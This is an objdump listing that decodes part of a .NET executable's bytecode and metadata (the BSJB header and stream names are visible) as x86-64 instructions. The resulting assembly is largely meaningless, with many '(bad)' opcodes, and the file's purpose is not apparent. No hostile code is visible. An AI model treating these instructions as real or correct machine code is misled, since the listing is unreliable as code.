   140002ad6:	00 00                	add    %al,(%rax)
   140002ad8:	0a 9e 25 19 06 1f    	or     0x1f061925(%rsi),%bl
   140002ade:	0c 28                	or     $0x28,%al
   140002ae0:	57                   	push   %rdi
   140002ae1:	00 00                	add    %al,(%rax)
   140002ae3:	0a 9e 2a c2 02 7b    	or     0x7b02c22a(%rsi),%bl
   140002ae9:	0d 00 00 04 7e       	or     $0x7e040000,%eax
   140002aee:	58                   	pop    %rax
   140002aef:	00 00                	add    %al,(%rax)
   140002af1:	0a 28                	or     (%rax),%ch
   140002af3:	59                   	pop    %rcx
   140002af4:	00 00                	add    %al,(%rax)
   140002af6:	0a 2c 1d 02 7b 0d 00 	or     0xd7b02(,%rbx,1),%ch
   140002afd:	00 04 16             	add    %al,(%rsi,%rdx,1)
   140002b00:	20 00                	and    %al,(%rax)
   140002b02:	80 00 00             	addb   $0x0,(%rax)
   140002b05:	28 27                	sub    %ah,(%rdi)
   140002b07:	00 00                	add    %al,(%rax)
   140002b09:	06                   	(bad)
   140002b0a:	26 02 7e 58          	es add 0x58(%rsi),%bh
   140002b0e:	00 00                	add    %al,(%rax)
   140002b10:	0a 7d 0d             	or     0xd(%rbp),%bh
   140002b13:	00 00                	add    %al,(%rax)
   140002b15:	04 2a                	add    $0x2a,%al
   140002b17:	00 13                	add    %dl,(%rbx)
   140002b19:	30 05 00 68 00 00    	xor    %al,0x6800(%rip)        # 0x14000931f
   140002b1f:	00 0f                	add    %cl,(%rdi)
   140002b21:	00 00                	add    %al,(%rax)
   140002b23:	11 28                	adc    %ebp,(%rax)
   140002b25:	5a                   	pop    %rdx
   140002b26:	00 00                	add    %al,(%rax)
   140002b28:	0a 1a                	or     (%rdx),%bl
   140002b2a:	33 09                	xor    (%rcx),%ecx
   140002b2c:	02 7b 0a             	add    0xa(%rbx),%bh
   140002b2f:	00 00                	add    %al,(%rax)
   140002b31:	04 0a                	add    $0xa,%al
   140002b33:	2b 07                	sub    (%rdi),%eax
   140002b35:	02 7b 0b             	add    0xb(%rbx),%bh
   140002b38:	00 00                	add    %al,(%rax)
   140002b3a:	04 0a                	add    $0xa,%al
   140002b3c:	02 7e 58             	add    0x58(%rsi),%bh
   140002b3f:	00 00                	add    %al,(%rax)
   140002b41:	0a 06                	or     (%rsi),%al
   140002b43:	8e 69 73             	mov    0x73(%rcx),%gs
   140002b46:	5b                   	pop    %rbx
   140002b47:	00 00                	add    %al,(%rax)
   140002b49:	0a 20                	or     (%rax),%ah
   140002b4b:	00 30                	add    %dh,(%rax)
   140002b4d:	00 00                	add    %al,(%rax)
   140002b4f:	1f                   	(bad)
   140002b50:	40 28 26             	sub    %spl,(%rsi)
   140002b53:	00 00                	add    %al,(%rax)
   140002b55:	06                   	(bad)
   140002b56:	7d 0d                	jge    0x140002b65
   140002b58:	00 00                	add    %al,(%rax)
   140002b5a:	04 06                	add    $0x6,%al
   140002b5c:	16                   	(bad)
   140002b5d:	02 7b 0d             	add    0xd(%rbx),%bh
   140002b60:	00 00                	add    %al,(%rax)
   140002b62:	04 06                	add    $0x6,%al
   140002b64:	8e 69 28             	mov    0x28(%rcx),%gs
   140002b67:	5c                   	pop    %rsp
   140002b68:	00 00                	add    %al,(%rax)
   140002b6a:	0a 02                	or     (%rdx),%al
   140002b6c:	02 7b 0d             	add    0xd(%rbx),%bh
   140002b6f:	00 00                	add    %al,(%rax)
   140002b71:	04 d0                	add    $0xd0,%al
   140002b73:	0a 00                	or     (%rax),%al
   140002b75:	00 02                	add    %al,(%rdx)
   140002b77:	28 5d 00             	sub    %bl,0x0(%rbp)
   140002b7a:	00 0a                	add    %cl,(%rdx)
   140002b7c:	28 5e 00             	sub    %bl,0x0(%rsi)
   140002b7f:	00 0a                	add    %cl,(%rdx)
   140002b81:	74 0a                	je     0x140002b8d
   140002b83:	00 00                	add    %al,(%rax)
   140002b85:	02 7d 0c             	add    0xc(%rbp),%bh
   140002b88:	00 00                	add    %al,(%rax)
   140002b8a:	04 2a                	add    $0x2a,%al
   140002b8c:	1b 30                	sbb    (%rax),%esi
   140002b8e:	03 00                	add    (%rax),%eax
   140002b90:	4c 00 00             	rex.WR add %r8b,(%rax)
   140002b93:	00 10                	add    %dl,(%rax)
   140002b95:	00 00                	add    %al,(%rax)
   140002b97:	11 12                	adc    %edx,(%rdx)
   140002b99:	00 fe                	add    %bh,%dh
   140002b9b:	15 1c 00 00 01       	adc    $0x100001c,%eax
   140002ba0:	04 8e                	add    $0x8e,%al
   140002ba2:	69 1f 10 2f 0b 72    	imul   $0x720b2f10,(%rdi),%ebx
   140002ba8:	43 02 00             	rex.XB add (%r8),%al
   140002bab:	70 73                	jo     0x140002c20
   140002bad:	5f                   	pop    %rdi
   140002bae:	00 00                	add    %al,(%rax)
   140002bb0:	0a 7a 00             	or     0x0(%rdx),%bh
   140002bb3:	04 19                	add    $0x19,%al
   140002bb5:	28 60 00             	sub    %ah,0x0(%rax)
   140002bb8:	00 0a                	add    %cl,(%rdx)
   140002bba:	0a 02                	or     (%rdx),%al
   140002bbc:	7b 0c                	jnp    0x140002bca
   140002bbe:	00 00                	add    %al,(%rax)
   140002bc0:	04 03                	add    $0x3,%al
   140002bc2:	04 6f                	add    $0x6f,%al
   140002bc4:	2d 00 00 06 de       	sub    $0xde060000,%eax
   140002bc9:	19 06                	sbb    %eax,(%rsi)
   140002bcb:	12 01                	adc    (%rcx),%al
   140002bcd:	fe                   	(bad)
   140002bce:	15 1c 00 00 01       	adc    $0x100001c,%eax
   140002bd3:	07                   	(bad)
   140002bd4:	28 61 00             	sub    %ah,0x0(%rcx)
   140002bd7:	00 0a                	add    %cl,(%rdx)
   140002bd9:	2c 07                	sub    $0x7,%al
   140002bdb:	12 00                	adc    (%rax),%al
   140002bdd:	28 62 00             	sub    %ah,0x0(%rdx)
   140002be0:	00 0a                	add    %cl,(%rdx)
   140002be2:	dc 2a                	fsubrl (%rdx)
   140002be4:	01 10                	add    %edx,(%rax)
   140002be6:	00 00                	add    %al,(%rax)
   140002be8:	02 00                	add    (%rax),%al
   140002bea:	1b 00                	sbb    (%rax),%eax
   140002bec:	17                   	(bad)
   140002bed:	32 00                	xor    (%rax),%al
   140002bef:	19 00                	sbb    %eax,(%rax)
   140002bf1:	00 00                	add    %al,(%rax)
   140002bf3:	00 de                	add    %bl,%dh
   140002bf5:	02 1f                	add    (%rdi),%bl
   140002bf7:	1e                   	(bad)
   140002bf8:	8d 30                	lea    (%rax),%esi
   140002bfa:	00 00                	add    %al,(%rax)
   140002bfc:	01 25 d0 0f 00 00    	add    %esp,0xfd0(%rip)        # 0x140003bd2
   140002c02:	04 28                	add    $0x28,%al
   140002c04:	63 00                	movsxd (%rax),%eax
   140002c06:	00 0a                	add    %cl,(%rdx)
   140002c08:	7d 0a                	jge    0x140002c14
   140002c0a:	00 00                	add    %al,(%rax)
   140002c0c:	04 02                	add    $0x2,%al
   140002c0e:	1f                   	(bad)
   140002c0f:	1a 8d 30 00 00 01    	sbb    0x1000030(%rbp),%cl
   140002c15:	25 d0 0e 00 00       	and    $0xed0,%eax
   140002c1a:	04 28                	add    $0x28,%al
   140002c1c:	63 00                	movsxd (%rax),%eax
   140002c1e:	00 0a                	add    %cl,(%rdx)
   140002c20:	7d 0b                	jge    0x140002c2d
   140002c22:	00 00                	add    %al,(%rax)
   140002c24:	04 02                	add    $0x2,%al
   140002c26:	28 36                	sub    %dh,(%rsi)
   140002c28:	00 00                	add    %al,(%rax)
   140002c2a:	0a 2a                	or     (%rdx),%ch
   140002c2c:	6e                   	outsb  (%rsi),(%dx)
   140002c2d:	20 00                	and    %al,(%rax)
   140002c2f:	01 00                	add    %eax,(%rax)
   140002c31:	00 8d 40 00 00 01    	add    %cl,0x1000040(%rbp)
   140002c37:	25 d0 10 00 00       	and    $0x10d0,%eax
   140002c3c:	04 28                	add    $0x28,%al
   140002c3e:	63 00                	movsxd (%rax),%eax
   140002c40:	00 0a                	add    %cl,(%rdx)
   140002c42:	80 09 00             	orb    $0x0,(%rcx)
   140002c45:	00 04 2a             	add    %al,(%rdx,%rbp,1)
   140002c48:	1e                   	(bad)
   140002c49:	02 28                	add    (%rax),%ch
   140002c4b:	36 00 00             	ss add %al,(%rax)
   140002c4e:	0a 2a                	or     (%rdx),%ch
   140002c50:	9a                   	(bad)
   140002c51:	03 6f 22             	add    0x22(%rdi),%ebp
   140002c54:	00 00                	add    %al,(%rax)
   140002c56:	0a 02                	or     (%rdx),%al
   140002c58:	7b 11                	jnp    0x140002c6b
   140002c5a:	00 00                	add    %al,(%rax)
   140002c5c:	04 2e                	add    $0x2e,%al
   140002c5e:	16                   	(bad)
   140002c5f:	7e 01                	jle    0x140002c62
   140002c61:	00 00                	add    %al,(%rax)
   140002c63:	04 03                	add    $0x3,%al
   140002c65:	6f                   	outsl  (%rsi),(%dx)
   140002c66:	27                   	(bad)
   140002c67:	00 00                	add    %al,(%rax)
   140002c69:	0a 6f 28             	or     0x28(%rdi),%ch
   140002c6c:	00 00                	add    %al,(%rax)
   140002c6e:	0a 6f 29             	or     0x29(%rdi),%ch
   140002c71:	00 00                	add    %al,(%rax)
   140002c73:	0a 2a                	or     (%rdx),%ch
   140002c75:	16                   	(bad)
   140002c76:	2a 00                	sub    (%rax),%al
   140002c78:	42 53                	rex.X push %rbx
   140002c7a:	4a                   	rex.WX
   140002c7b:	42 01 00             	rex.X add %eax,(%rax)
   140002c7e:	01 00                	add    %eax,(%rax)
   140002c80:	00 00                	add    %al,(%rax)
   140002c82:	00 00                	add    %al,(%rax)
   140002c84:	0c 00                	or     $0x0,%al
   140002c86:	00 00                	add    %al,(%rax)
   140002c88:	76 34                	jbe    0x140002cbe
   140002c8a:	2e 30 2e             	cs xor %ch,(%rsi)
   140002c8d:	33 30                	xor    (%rax),%esi
   140002c8f:	33 31                	xor    (%rcx),%esi
   140002c91:	39 00                	cmp    %eax,(%rax)
   140002c93:	00 00                	add    %al,(%rax)
   140002c95:	00 05 00 6c 00 00    	add    %al,0x6c00(%rip)        # 0x14000989b
   140002c9b:	00 c4                	add    %al,%ah
   140002c9d:	0b 00                	or     (%rax),%eax
   140002c9f:	00 23                	add    %ah,(%rbx)
   140002ca1:	7e 00                	jle    0x140002ca3
   140002ca3:	00 30                	add    %dh,(%rax)
   140002ca5:	0c 00                	or     $0x0,%al
   140002ca7:	00 54 0d 00          	add    %dl,0x0(%rbp,%rcx,1)
   140002cab:	00 23                	add    %ah,(%rbx)
   140002cad:	53                   	push   %rbx
   140002cae:	74 72                	je     0x140002d22
   140002cb0:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%rsi),%ebp
   140002cb7:	00 84 19 00 00 90 02 	add    %al,0x2900000(%rcx,%rbx,1)
   140002cbe:	00 00                	add    %al,(%rax)
   140002cc0:	23 55 53             	and    0x53(%rbp),%edx
   140002cc3:	00 14 1c             	add    %dl,(%rsp,%rbx,1)
   140002cc6:	00 00                	add    %al,(%rax)
   140002cc8:	10 00                	adc    %al,(%rax)
   140002cca:	00 00                	add    %al,(%rax)
   140002ccc:	23 47 55             	and    0x55(%rdi),%eax
   140002ccf:	49                   	rex.WB
   140002cd0:	44 00 00             	add    %r8b,(%rax)
   140002cd3:	00 24 1c             	add    %ah,(%rsp,%rbx,1)
   140002cd6:	00 00                	add    %al,(%rax)
   140002cd8:	50                   	push   %rax
   140002cd9:	04 00                	add    $0x0,%al
   140002cdb:	00 23                	add    %ah,(%rbx)
   140002cdd:	42 6c                	rex.X insb (%dx),(%rdi)
   140002cdf:	6f                   	outsl  (%rsi),(%dx)
   140002ce0:	62                   	(bad)
   140002ce1:	00 00                	add    %al,(%rax)
   140002ce3:	00 00                	add    %al,(%rax)
   140002ce5:	00 00                	add    %al,(%rax)
   140002ce7:	00 02                	add    %al,(%rdx)
   140002ce9:	00 00                	add    %al,(%rax)
   140002ceb:	01 57 9d             	add    %edx,-0x63(%rdi)
   140002cee:	a2 3f 09 0a 00 00 00 	movabs %al,0x1fa0000000a093f
   140002cf5:	fa 01 
   140002cf7:	33 00                	xor    (%rax),%eax
   140002cf9:	16                   	(bad)
   140002cfa:	00 00                	add    %al,(%rax)
   140002cfc:	01 00                	add    %eax,(%rax)
   140002cfe:	00 00                	add    %al,(%rax)
   140002d00:	4a 00 00             	rex.WX add %al,(%rax)
   140002d03:	00 0f                	add    %cl,(%rdi)
   140002d05:	00 00                	add    %al,(%rax)
   140002d07:	00 25 00 00 00 2f    	add    %ah,0x2f000000(%rip)        # 0x16f002d0d
   140002d0d:	00 00                	add    %al,(%rax)
   140002d0f:	00 29                	add    %ch,(%rcx)
   140002d11:	00 00                	add    %al,(%rax)
   140002d13:	00 63 00             	add    %ah,0x0(%rbx)
   140002d16:	00 00                	add    %al,(%rax)
   140002d18:	15 00 00 00 16       	adc    $0x16000000,%eax
   140002d1d:	00 00                	add    %al,(%rax)
   140002d1f:	00 03                	add    %al,(%rbx)
   140002d21:	00 00                	add    %al,(%rax)
   140002d23:	00 10                	add    %dl,(%rax)
   140002d25:	00 00                	add    %al,(%rax)
   140002d27:	00 01                	add    %al,(%rcx)
   140002d29:	00 00                	add    %al,(%rax)
   140002d2b:	00 01                	add    %al,(%rcx)
   140002d2d:	00 00                	add    %al,(%rax)
   140002d2f:	00 02                	add    %al,(%rdx)
   140002d31:	00 00                	add    %al,(%rax)
   140002d33:	00 02                	add    %al,(%rdx)
   140002d35:	00 00                	add    %al,(%rax)
   140002d37:	00 02                	add    %al,(%rdx)
   140002d39:	00 00                	add    %al,(%rax)
   140002d3b:	00 02                	add    %al,(%rdx)
   140002d3d:	00 00                	add    %al,(%rax)
   140002d3f:	00 02                	add    %al,(%rdx)
   140002d41:	00 00                	add    %al,(%rax)
   140002d43:	00 03                	add    %al,(%rbx)
   140002d45:	00 00                	add    %al,(%rax)
   140002d47:	00 01                	add    %al,(%rcx)
   140002d49:	00 00                	add    %al,(%rax)
   140002d4b:	00 03                	add    %al,(%rbx)
   140002d4d:	00 00                	add    %al,(%rax)
   140002d4f:	00 07                	add    %al,(%rdi)
   140002d51:	00 00                	add    %al,(%rax)
   140002d53:	00 02                	add    %al,(%rdx)
   140002d55:	00 00                	add    %al,(%rax)
   140002d57:	00 00                	add    %al,(%rax)
   140002d59:	00 d7                	add    %dl,%bh
   140002d5b:	06                   	(bad)
   140002d5c:	01 00                	add    %eax,(%rax)
   140002d5e:	00 00                	add    %al,(%rax)
   140002d60:	00 00                	add    %al,(%rax)
   140002d62:	06                   	(bad)
   140002d63:	00 25 06 69 0a 06    	add    %ah,0x60a6906(%rip)        # 0x1460a966f
   140002d69:	00 92 06 69 0a 06    	add    %dl,0x60a6906(%rdx)
   140002d6f:	00 28                	add    %ch,(%rax)
   140002d71:	05 1f 0a 0f 00       	add    $0xf0a1f,%eax
   140002d76:	89 0a                	mov    %ecx,(%rdx)
   140002d78:	00 00                	add    %al,(%rax)
   140002d7a:	06                   	(bad)
   140002d7b:	00 50 05             	add    %dl,0x5(%rax)
   140002d7e:	73 08                	jae    0x140002d88
   140002d80:	06                   	(bad)
   140002d81:	00 d7                	add    %dl,%bh
   140002d83:	05 73 08 06 00       	add    $0x60873,%eax
   140002d88:	b8 05 73 08 06       	mov    $0x6087305,%eax
   140002d8d:	00 79 06             	add    %bh,0x6(%rcx)
   140002d90:	73 08                	jae    0x140002d9a
   140002d92:	06                   	(bad)
   140002d93:	00 45 06             	add    %al,0x6(%rbp)
   140002d96:	73 08                	jae    0x140002da0
   140002d98:	06                   	(bad)
   140002d99:	00 5e 06             	add    %bl,0x6(%rsi)
   140002d9c:	73 08                	jae    0x140002da6
   140002d9e:	06                   	(bad)
   140002d9f:	00 67 05             	add    %ah,0x5(%rdi)
   140002da2:	73 08                	jae    0x140002dac
   140002da4:	06                   	(bad)
   140002da5:	00 3c 05 4a 0a 06 00 	add    %bh,0x60a4a(,%rax,1)
   140002dac:	1a 05 4a 0a 06 00    	sbb    0x60a4a(%rip),%al        # 0x1400637fc
   140002db2:	9b                   	fwait
   140002db3:	05 73 08 06 00       	add    $0x60873,%eax
   140002db8:	82                   	(bad)
   140002db9:	05 74 07 06 00       	add    $0x60774,%eax
   140002dbe:	d5 0b 06             	{rex2 0xb} (bad)
   140002dc1:	08 06                	or     %al,(%rsi)
   140002dc3:	00 54 00 68          	add    %dl,0x68(%rax,%rax,1)
   140002dc7:	02 06                	add    (%rsi),%al
   140002dc9:	00 ff                	add    %bh,%bh
   140002dcb:	04 69                	add    $0x69,%al
   140002dcd:	0a 0a                	or     (%rdx),%cl
   140002dcf:	00 5d 0b             	add    %bl,0xb(%rbp)
   140002dd2:	1f                   	(bad)
   140002dd3:	0a 06                	or     (%rsi),%al
   140002dd5:	00 c9                	add    %cl,%cl
   140002dd7:	0b 06                	or     (%rsi),%eax
   140002dd9:	08 06                	or     %al,(%rsi)
   140002ddb:	00 fc                	add    %bh,%ah
   140002ddd:	0c 73                	or     $0x73,%al
   140002ddf:	08 0a                	or     %cl,(%rdx)
   140002de1:	00 09                	add    %cl,(%rcx)
   140002de3:	0c 9a                	or     $0x9a,%al
   140002de5:	0b 06                	or     (%rsi),%eax
   140002de7:	00 d5                	add    %dl,%ch
   140002de9:	07                   	(bad)
   140002dea:	04 0b                	add    $0xb,%al
   140002dec:	06                   	(bad)
   140002ded:	00 69 0c             	add    %ch,0xc(%rcx)
   140002df0:	4b 07                	rex.WXB (bad)
   140002df2:	06                   	(bad)
   140002df3:	00 b0 08 06 08 0a    	add    %dh,0xa080608(%rax)
   140002df9:	00 73 0b             	add    %dh,0xb(%rbx)
   140002dfc:	fa                   	cli
   140002dfd:	0b 0a                	or     (%rdx),%ecx
   140002dff:	00 0b                	add    %cl,(%rbx)
   140002e01:	03 4e 08             	add    0x8(%rsi),%ecx
   140002e04:	06                   	(bad)
   140002e05:	00 6c 03 4a          	add    %ch,0x4a(%rbx,%rax,1)
   140002e09:	0a 06                	or     (%rsi),%al
   140002e0b:	00 96 08 4a 0a 06    	add    %dl,0x60a4a08(%rsi)
   140002e11:	00 f4                	add    %dh,%ah
   140002e13:	05 4a 0a 06 00       	add    $0x60a4a,%eax
   140002e18:	ed                   	in     (%dx),%eax
   140002e19:	04 06                	add    $0x6,%al
   140002e1b:	08 06                	or     %al,(%rsi)
   140002e1d:	00 28                	add    %ch,(%rax)
   140002e1f:	0c 06                	or     $0x6,%al
   140002e21:	08 06                	or     %al,(%rsi)
   140002e23:	00 be 07 06 08 06    	add    %bh,0x6080607(%rsi)
   140002e29:	00 16                	add    %dl,(%rsi)
   140002e2b:	06                   	(bad)
   140002e2c:	06                   	(bad)
   140002e2d:	08 06                	or     %al,(%rsi)
   140002e2f:	00 24 08             	add    %ah,(%rax,%rcx,1)
   140002e32:	06                   	(bad)
   140002e33:	08 06                	or     %al,(%rsi)
   140002e35:	00 7e 04             	add    %bh,0x4(%rsi)
   140002e38:	06                   	(bad)
   140002e39:	08 06                	or     %al,(%rsi)
   140002e3b:	00 af 02 4b 07 0a    	add    %ch,0xa074b02(%rdi)
   140002e41:	00 f1                	add    %dh,%cl
   140002e43:	08 1f                	or     %bl,(%rdi)
   140002e45:	0a 0a                	or     (%rdx),%cl
   140002e47:	00 fa                	add    %bh,%dl
   140002e49:	03 1f                	add    (%rdi),%ebx
   140002e4b:	0a 06                	or     (%rsi),%al
   140002e4d:	00 90 07 06 08 0e    	add    %dl,0xe080607(%rax)
   140002e53:	00 61 03             	add    %ah,0x3(%rcx)
   140002e56:	18 09                	sbb    %cl,(%rcx)
   140002e58:	06                   	(bad)
   140002e59:	00 46 00             	add    %al,0x0(%rsi)
   140002e5c:	68 02 06 00 75       	push   $0x75000602
   140002e61:	00 06                	add    %al,(%rsi)
   140002e63:	08 06                	or     %al,(%rsi)
   140002e65:	00 6f 00             	add    %ch,0x0(%rdi)
   140002e68:	06                   	(bad)
   140002e69:	08 06                	or     %al,(%rsi)
   140002e6b:	00 d8                	add    %bl,%al
   140002e6d:	08 73 08             	or     %dh,0x8(%rbx)
   140002e70:	06                   	(bad)
   140002e71:	00 bd 04 73 08 06    	add    %bh,0x6087304(%rbp)
   140002e77:	00 d3                	add    %dl,%bl
   140002e79:	09 06                	or     %eax,(%rsi)
   140002e7b:	08 06                	or     %al,(%rsi)
   140002e7d:	00 c4                	add    %al,%ah
   140002e7f:	06                   	(bad)
   140002e80:	06                   	(bad)
   140002e81:	08 06                	or     %al,(%rsi)
   140002e83:	00 f6                	add    %dh,%dh
   140002e85:	0c 06                	or     $0x6,%al
   140002e87:	08 0a                	or     %cl,(%rdx)
   140002e89:	00 05 0d 9a 0b 0a    	add    %al,0xa0b9a0d(%rip)        # 0x14a0bc89c
   140002e8f:	00 a6 04 9a 0b 0a    	add    %ah,0xa0b9a04(%rsi)
   140002e95:	00 88 04 9a 0b 06    	add    %cl,0x60b9a04(%rax)
   140002e9b:	00 c5                	add    %al,%ch
   140002e9d:	03 4b 07             	add    0x7(%rbx),%ecx
   140002ea0:	06                   	(bad)
   140002ea1:	00 28                	add    %ch,(%rax)
   140002ea3:	0d 04 0b 06 00       	or     $0x60b04,%eax
   140002ea8:	6c                   	insb   (%dx),(%rdi)
   140002ea9:	08 06                	or     %al,(%rsi)
   140002eab:	08 06                	or     %al,(%rsi)
   140002ead:	00 0d 08 06 08 06    	add    %cl,0x6080608(%rip)        # 0x1460834bb
   140002eb3:	00 3c 0c             	add    %bh,(%rsp,%rcx,1)
   140002eb6:	06                   	(bad)
   140002eb7:	08 06                	or     %al,(%rsi)
   140002eb9:	00 5c 07 aa          	add    %bl,-0x56(%rdi,%rax,1)
   140002ebd:	0c 06                	or     $0x6,%al
   140002ebf:	00 c0                	add    %al,%al
   140002ec1:	03 4b 07             	add    0x7(%rbx),%ecx
   140002ec4:	0a 00                	or     (%rax),%al
   140002ec6:	1b 0b                	sbb    (%rbx),%ecx
   140002ec8:	fa                   	cli
   140002ec9:	0b 0a                	or     (%rdx),%ecx
   140002ecb:	00 a8 0a 4e 08 0a    	add    %ch,0xa084e0a(%rax)
   140002ed1:	00 80 0b 4e 08 06    	add    %al,0x6084e0b(%rax)
   140002ed7:	00 66 00             	add    %ah,0x0(%rsi)
   140002eda:	06                   	(bad)
   140002edb:	08 06                	or     %al,(%rsi)
   140002edd:	00 7c 00 06          	add    %bh,0x6(%rax,%rax,1)
   140002ee1:	08 06                	or     %al,(%rsi)
   140002ee3:	00 18                	add    %bl,(%rax)
   140002ee5:	0a 06                	or     (%rsi),%al
   140002ee7:	08 06                	or     %al,(%rsi)
   140002ee9:	00 17                	add    %dl,(%rdi)
   140002eeb:	0a 06                	or     (%rsi),%al
   140002eed:	08 06                	or     %al,(%rsi)
   140002eef:	00 da                	add    %bl,%dl
   140002ef1:	07                   	(bad)
   140002ef2:	4a 0a 06             	rex.WX or (%rsi),%al
   140002ef5:	00 ac 04 06 08 06 00 	add    %ch,0x60806(%rsp,%rax,1)
   140002efc:	88 03                	mov    %al,(%rbx)
   140002efe:	06                   	(bad)
   140002eff:	08 06                	or     %al,(%rsi)
   140002f01:	00 f6                	add    %dh,%dh
   140002f03:	04 06                	add    $0x6,%al
   140002f05:	08 06                	or     %al,(%rsi)
   140002f07:	00 a8 08 06 08 06    	add    %ch,0x6080608(%rax)
   140002f0d:	00 71 04             	add    %dh,0x4(%rcx)
   140002f10:	4a 0a 06             	rex.WX or (%rsi),%al
   140002f13:	00 32                	add    %dh,(%rdx)
   140002f15:	0b 69 0a             	or     0xa(%rcx),%ebp
   140002f18:	06                   	(bad)
   140002f19:	00 75 03             	add    %dh,0x3(%rbp)
   140002f1c:	06                   	(bad)
   140002f1d:	08 00                	or     %al,(%rax)
   140002f1f:	00 00                	add    %al,(%rax)
   140002f21:	00 09                	add    %cl,(%rcx)
   140002f23:	01 00                	add    %eax,(%rax)
   140002f25:	00 00                	add    %al,(%rax)
   140002f27:	00 01                	add    %al,(%rcx)
   140002f29:	00 01                	add    %al,(%rcx)
   140002f2b:	00 81 01 10 00 fe    	add    %al,-0x1ffefff(%rcx)
   140002f31:	07                   	(bad)
   140002f32:	28 09                	sub    %cl,(%rcx)
   140002f34:	41 00 01             	add    %al,(%r9)
   140002f37:	00 01                	add    %al,(%rcx)
   140002f39:	00 01                	add    %al,(%rcx)
   140002f3b:	00 10                	add    %dl,(%rax)
   140002f3d:	00 9c 09 ba 08 51 00 	add    %bl,0x5108ba(%rcx,%rcx,1)
   140002f44:	02 00                	add    (%rax),%al
   140002f46:	0a 00                	or     (%rax),%al
   140002f48:	01 00                	add    %eax,(%rax)
   140002f4a:	10 00                	adc    %al,(%rax)
   140002f4c:	33 09                	xor    (%rcx),%ecx
   140002f4e:	ba 08 41 00 03       	mov    $0x3004108,%edx
   140002f53:	00 0d 00 01 00 10    	add    %cl,0x10000100(%rip)        # 0x150003059
   140002f59:	00 48 0c             	add    %cl,0xc(%rax)
   140002f5c:	ba 08 41 00 03       	mov    $0x3004108,%edx
   140002f61:	00 0f                	add    %cl,(%rdi)
   140002f63:	00 01                	add    %al,(%rcx)
   140002f65:	00 10                	add    %dl,(%rax)
   140002f67:	00 24 09             	add    %ah,(%rcx,%rcx,1)
   140002f6a:	ba 08 41 00 04       	mov    $0x4004108,%edx
   140002f6f:	00 12                	add    %dl,(%rdx)
   140002f71:	00 01                	add    %al,(%rcx)
   140002f73:	00 10                	add    %dl,(%rax)
   140002f75:	00 f0                	add    %dh,%al
   140002f77:	09 ba 08 41 00 09    	or     %edi,0x9004108(%rdx)
   140002f7d:	00 1c 00             	add    %bl,(%rax,%rax,1)
   140002f80:	00 01                	add    %al,(%rcx)
   140002f82:	00 00                	add    %al,(%rax)
   140002f84:	12 01                	adc    (%rcx),%al
   140002f86:	00 00                	add    %al,(%rax)
   140002f88:	41 00 0e             	add    %cl,(%r14)
   140002f8b:	00 2a                	add    %ch,(%rdx)
   140002f8d:	00 03                	add    %al,(%rbx)
   140002f8f:	01 10                	add    %edx,(%rax)
   140002f91:	00 1e                	add    %bl,(%rsi)
   140002f93:	00 00                	add    %al,(%rax)
   140002f95:	00 41 00             	add    %al,0x0(%rcx)
   140002f98:	11 00                	adc    %eax,(%rax)
   140002f9a:	2a 00                	sub    (%rax),%al
   140002f9c:	02 01                	add    (%rcx),%al
   140002f9e:	00 00                	add    %al,(%rax)
   140002fa0:	df 04 00             	filds  (%rax,%rax,1)
   140002fa3:	00 7d 00             	add    %bh,0x0(%rbp)
   140002fa6:	12 00                	adc    (%rax),%al
   140002fa8:	2c 00                	sub    $0x0,%al
   140002faa:	02 01                	add    (%rcx),%al
   140002fac:	00 00                	add    %al,(%rax)
   140002fae:	97                   	xchg   %eax,%edi
   140002faf:	04 00                	add    $0x0,%al
   140002fb1:	00 8d 00 12 00 30    	add    %cl,0x30001200(%rbp)
   140002fb7:	00 02                	add    %al,(%rdx)
   140002fb9:	01 00                	add    %eax,(%rax)
   140002fbb:	00 85 08 00 00 8d    	add    %al,-0x72fffff8(%rbp)
   140002fc1:	00 1a                	add    %bl,(%rdx)
   140002fc3:	00 30                	add    %dh,(%rax)
   140002fc5:	00 13                	add    %dl,(%rbx)
   140002fc7:	01 00                	add    %eax,(%rax)
   140002fc9:	00 83 00 00 00 91    	add    %al,-0x6f000000(%rbx)
   140002fcf:	00 26                	add    %ah,(%rsi)
   140002fd1:	00 30                	add    %dh,(%rax)
   140002fd3:	00 13                	add    %dl,(%rbx)
   140002fd5:	01 00                	add    %eax,(%rax)
   140002fd7:	00 01                	add    %al,(%rcx)
   140002fd9:	00 00                	add    %al,(%rax)
   140002fdb:	00 91 00 26 00 30    	add    %dl,0x30002600(%rcx)
   140002fe1:	00 13                	add    %dl,(%rbx)
   140002fe3:	01 00                	add    %eax,(%rax)
   140002fe5:	00 e1                	add    %ah,%cl
   140002fe7:	00 00                	add    %al,(%rax)
   140002fe9:	00 91 00 26 00 30    	add    %dl,0x30002600(%rcx)
   140002fef:	00 31                	add    %dh,(%rcx)
   140002ff1:	00 42 04             	add    %al,0x4(%rdx)
   140002ff4:	99                   	cltd
   140002ff5:	02 36                	add    (%rsi),%dh
   140002ff7:	00 3c 08             	add    %bh,(%rax,%rcx,1)
   140002ffa:	5c                   	pop    %rsp
   140002ffb:	01 01                	add    %eax,(%rcx)
   140002ffd:	00 da                	add    %bl,%dl
   140002fff:	02 a0 02 01 00 e0    	add    -0x1ffffefe(%rax),%ah
   140003005:	09 a4 02 01 00 55 09 	or     %esp,0x9550001(%rdx,%rax,1)
   14000300c:	a0 02 01 00 c9 0c a8 	movabs 0x102a80cc9000102,%al
   140003013:	02 01 
   140003015:	00 a1 07 ac 02 21    	add    %ah,0x2102ac07(%rcx)
   14000301b:	00 5a 0c             	add    %bl,0xc(%rdx)
   14000301e:	af                   	scas   (%rdi),%eax
   14000301f:	02 31                	add    (%rcx),%dh
   140003021:	00 57 03             	add    %dl,0x3(%rdi)
   140003024:	b3 02                	mov    $0x2,%bl
   140003026:	01 00                	add    %eax,(%rax)
   140003028:	e9 0a a0 02 01       	jmp    0x14102d037
   14000302d:	00 dc                	add    %bl,%ah
   14000302f:	0a a0 02 01 00 41    	or     0x41000102(%rax),%ah
   140003035:	07                   	(bad)
   140003036:	b7 02                	mov    $0x2,%bh
   140003038:	01 00                	add    %eax,(%rax)
   14000303a:	a9 09 e6 01 33       	test   $0x3301e609,%eax
   14000303f:	01 a0 00 bb 02 33    	add    %esp,0x3302bb00(%rax)
   140003045:	01 bb 01 bf 02 33    	add    %edi,0x3302bf01(%rbx)
   14000304b:	01 31                	add    %esi,(%rcx)
   14000304d:	01 c3                	add    %eax,%ebx
   14000304f:	02 06                	add    (%rsi),%al
   140003051:	00 cd                	add    %cl,%ch
